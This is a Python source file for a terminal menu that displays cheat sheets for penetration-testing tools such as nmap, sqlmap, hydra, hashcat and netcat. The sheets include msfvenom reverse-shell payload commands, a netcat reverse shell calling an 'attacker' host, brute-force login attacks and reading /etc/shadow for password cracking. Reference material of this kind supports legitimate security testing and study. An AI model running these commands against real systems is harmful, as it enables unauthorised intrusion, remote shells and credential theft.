from rich.console import Console
from rich.panel import Panel
from InquirerPy import inquirer

SHEETS = {
    "nmap": """[bold cyan]Nmap Cheat Sheet[/bold cyan]

[bold]Scan Types:[/bold]
  -sS          TCP SYN (stealth) scan
  -sT          TCP connect scan
  -sU          UDP scan
  -sV          Version detection
  -O           OS detection
  -A           Aggressive (OS + version + scripts + traceroute)

[bold]Port Selection:[/bold]
  -p 80,443    Specific ports
  -p-          All 65535 ports
  --top-ports 100  Top 100 common ports
  -F           Fast scan (top 100)

[bold]Speed & Timing:[/bold]
  -T0 to -T5  Timing templates (0=paranoid, 5=insane)

[bold]Output:[/bold]
  -oN file     Normal output
  -oX file     XML output
  -oG file     Grepable output
  -oA base     All formats

[bold]Scripts:[/bold]
  --script vuln            Vulnerability scripts
  --script=default         Default script set
  --script smb-enum-shares SMB shares enum

[bold]Examples:[/bold]
  nmap -sV -sC 10.0.0.1         Service + default scripts
  nmap -sS -T4 -p- 10.0.0.0/24  Fast SYN scan all ports on subnet
  nmap --script vuln 10.0.0.1    Vulnerability scan""",

    "nikto": """[bold cyan]Nikto Cheat Sheet[/bold cyan]

[bold]Common Flags:[/bold]
  -h host      Target host
  -p port      Target port
  -ssl         Force SSL
  -nossl       Disable SSL
  -Tuning x    Scan tuning (1-9, a-c)
  -output f    Save to file
  -Format htm  Output format (htm, csv, txt, xml)

[bold]Tuning Options:[/bold]
  1  Interesting File        6  Denial of Service
  2  Misconfiguration        7  Remote File Retrieval
  3  Information Disclosure   8  Command Execution
  4  Injection (XSS/Script)  9  SQL Injection
  5  Remote File Retrieval

[bold]Examples:[/bold]
  nikto -h http://target.com -ssl
  nikto -h 10.0.0.1 -p 8080
  nikto -h target.com -Tuning 1234 -output report.html""",

    "gobuster": """[bold cyan]Gobuster Cheat Sheet[/bold cyan]

[bold]Modes:[/bold]
  dir    Directory/file brute-force
  dns    DNS subdomain brute-force
  vhost  Virtual host brute-force

[bold]Common Flags (dir):[/bold]
  -u URL           Target URL
  -w wordlist      Wordlist path
  -x ext           File extensions (php,html,txt)
  -t threads       Number of threads (default 10)
  -s codes         Status codes to match (200,301,302)
  -b codes         Status codes to blacklist
  -k               Skip TLS verification
  -r               Follow redirects
  -o file          Output to file

[bold]Common Flags (dns):[/bold]
  -d domain        Target domain
  -w wordlist      Wordlist
  --wildcard       Force wildcard processing

[bold]Examples:[/bold]
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://target.com -w list.txt -x php,html -t 50
  gobuster dns -d target.com -w subdomains.txt""",

    "metasploit": """[bold cyan]Metasploit Cheat Sheet[/bold cyan]

[bold]Core Commands:[/bold]
  search <term>      Search for modules
  use <module>       Select a module
  info               Show module info
  show options       Show module options
  set RHOSTS <ip>    Set target
  run / exploit      Execute module
  back               Deselect module

[bold]Common Modules:[/bold]
  auxiliary/scanner/portscan/tcp      Port scanner
  auxiliary/scanner/smb/smb_version   SMB version detect
  auxiliary/scanner/http/dir_scanner  HTTP directory scan
  exploit/multi/handler               Payload handler

[bold]Msfvenom Payloads:[/bold]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f exe > shell.exe
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f elf > shell.elf
  msfvenom -l payloads   List all payloads

[bold]Post Exploitation:[/bold]
  sysinfo, getuid, getsystem, hashdump, shell""",

    "sqlmap": """[bold cyan]SQLMap Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  -u URL              Target URL with parameter
  --dbs               Enumerate databases
  -D db --tables      Enumerate tables
  -D db -T tbl --dump Dump table data
  --batch             Non-interactive mode

[bold]Detection:[/bold]
  --level 1-5         Test level (default 1)
  --risk 1-3          Risk level (default 1)
  --technique BEUSTQ  Injection techniques

[bold]Useful Flags:[/bold]
  --crawl=3           Crawl site (depth 3)
  --forms             Auto-test forms
  --random-agent      Random User-Agent
  --proxy http://x    Use proxy
  --os-shell          OS shell
  --sql-shell         SQL shell
  --threads 5         Concurrent requests

[bold]Examples:[/bold]
  sqlmap -u "http://target/page?id=1" --dbs --batch
  sqlmap -u "http://target/page?id=1" -D mydb --tables
  sqlmap -u "http://target/page?id=1" --forms --crawl=2""",

    "hydra": """[bold cyan]Hydra Cheat Sheet[/bold cyan]

[bold]Syntax:[/bold]
  hydra -l user -P passlist target service

[bold]Common Flags:[/bold]
  -l user        Single username
  -L userlist    Username list
  -p pass        Single password
  -P passlist    Password list
  -t threads     Threads (default 16)
  -s port        Custom port
  -f             Stop on first found
  -vV            Verbose output

[bold]Services:[/bold]
  ssh, ftp, http-post-form, smtp, mysql, rdp, vnc, telnet, smb

[bold]HTTP Form Example:[/bold]
  hydra -l admin -P list.txt target http-post-form \\
    "/login:user=^USER^&pass=^PASS^:F=Invalid"

[bold]Examples:[/bold]
  hydra -l root -P rockyou.txt 10.0.0.1 ssh
  hydra -L users.txt -P pass.txt 10.0.0.1 ftp -t 4""",

    "john": """[bold cyan]John the Ripper Cheat Sheet[/bold cyan]

[bold]Basic Usage:[/bold]
  john hashfile              Auto-detect and crack
  john --show hashfile       Show cracked passwords
  john --wordlist=list hash  Dictionary attack

[bold]Common Flags:[/bold]
  --wordlist=file    Dictionary file
  --rules            Enable word mangling rules
  --incremental      Brute-force mode
  --format=type      Force hash format
  --fork=N           Use N processes

[bold]Hash Formats:[/bold]
  --format=raw-md5, raw-sha1, raw-sha256, bcrypt, nt, zip, rar

[bold]Utility:[/bold]
  unshadow /etc/passwd /etc/shadow > hashes.txt
  zip2john file.zip > hash.txt
  rar2john file.rar > hash.txt

[bold]Examples:[/bold]
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  john --incremental --format=raw-md5 hashes.txt""",

    "hashcat": """[bold cyan]Hashcat Cheat Sheet[/bold cyan]

[bold]Syntax:[/bold]
  hashcat -m type -a mode hashfile wordlist

[bold]Attack Modes (-a):[/bold]
  0  Dictionary       3  Brute-force/Mask
  1  Combination      6  Hybrid (dict+mask)

[bold]Common Hash Types (-m):[/bold]
  0     MD5            1000  NTLM
  100   SHA-1          3200  bcrypt
  1400  SHA-256        22000 WPA/WPA2

[bold]Mask Charset:[/bold]
  ?l lowercase  ?u uppercase  ?d digits  ?s special  ?a all

[bold]Useful Flags:[/bold]
  --show           Show cracked
  -O               Optimized kernels
  -w 3             Workload (1-4)
  --force          Ignore warnings
  -r rules.rule    Apply rules

[bold]Examples:[/bold]
  hashcat -m 0 -a 0 hashes.txt rockyou.txt
  hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
  hashcat -m 0 hashes.txt --show""",

    "netcat": """[bold cyan]Netcat Cheat Sheet[/bold cyan]

[bold]Listen & Connect:[/bold]
  nc -lvp 4444              Listen on port
  nc target 4444            Connect to port
  nc -lvp 4444 -e /bin/sh   Bind shell (ncat)

[bold]File Transfer:[/bold]
  Receiver: nc -lvp 4444 > file.txt
  Sender:   nc target 4444 < file.txt

[bold]Port Scanning:[/bold]
  nc -zv target 1-1000      Scan ports 1-1000

[bold]Reverse Shell:[/bold]
  Listener: nc -lvp 4444
  Target:   nc attacker 4444 -e /bin/sh

[bold]Chat:[/bold]
  Server: nc -lvp 4444
  Client: nc server 4444

[bold]Flags:[/bold]
  -l   Listen mode        -v   Verbose
  -p   Port               -z   Zero-I/O (scan)
  -u   UDP mode           -w N Timeout (seconds)
  -e   Execute program    -k   Keep listening""",

    "recon": """[bold cyan]Recon Autopilot Cheat Sheet[/bold cyan]

[bold]What it does:[/bold]
  Chains multiple tools automatically:
  • Nmap for port/service discovery
  • Nikto for web vulnerability scanning
  • Gobuster for directory brute-forcing
  • SQLMap for SQL injection crawling

[bold]Presets:[/bold]
  Quick recon    — Nmap fast + Gobuster
  Full recon     — Nmap + Nikto + Gobuster
  Web app recon  — Nikto + Gobuster + SQLMap crawl
  Stealth recon  — Nmap SYN scan only

[bold]Tips:[/bold]
  • Results are combined into a single timestamped log
  • Each scan has a 5-minute timeout
  • Skips tools that aren't installed""",
}

# Map menu names to sheet keys
TOOL_KEY_MAP = {
    "Nmap — Network Scanner": "nmap",
    "Nikto — Web Server Scanner": "nikto",
    "Gobuster — Directory & DNS Brute Force": "gobuster",
    "Metasploit — Exploitation Framework": "metasploit",
    "SQLMap — SQL Injection Tester": "sqlmap",
    "Hydra — Brute Force": "hydra",
    "John the Ripper — Password Cracker": "john",
    "Hashcat — GPU Password Cracker": "hashcat",
    "Netcat — Network Swiss Army Knife": "netcat",
    "Recon Autopilot — Auto-scan a target": "recon",
}


def show_cheatsheet(console: Console, tool_key: str):
    """Display a cheat sheet for the given tool key."""
    sheet = SHEETS.get(tool_key)
    if not sheet:
        console.print(f"[red]No cheat sheet for '{tool_key}'.[/red]")
        return
    console.print(Panel(sheet, border_style="cyan", padding=(1, 2)))


def cheatsheet_menu(console: Console):
    """Show sub-menu to pick a tool cheat sheet."""
    choices = list(SHEETS.keys()) + ["Back"]
    choice = inquirer.select(
        message="Pick a tool:",
        choices=choices,
        pointer="❯",
    ).execute()
    if choice != "Back":
        show_cheatsheet(console, choice)
